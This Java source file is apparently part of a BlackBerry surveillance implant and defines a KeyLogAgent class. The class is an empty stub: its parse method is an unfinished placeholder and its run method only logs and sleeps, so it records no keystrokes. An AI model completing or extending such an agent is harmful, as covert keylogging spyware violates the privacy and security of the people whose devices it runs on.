package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class KeyLogAgent extends Agent
{
	static Debug debug = new Debug("KeyLogAgent", DebugLevel.VERBOSE );
	public KeyLogAgent( int AgentStatus)
	{
		super(Agent.AGENT_KEYLOG, AgentStatus, true);

	}

	protected KeyLogAgent(int AgentStatus, byte[] confParams)
	{
		this(AgentStatus);
		Parse(confParams);
	}

	protected boolean Parse(byte[] confParameters)
	{
		// TODO Auto-generated method stub
		return false;
	}

	public void AgentRun()
	{
		debug.trace("run");
		this.SleepUntilStopped();

	}

}
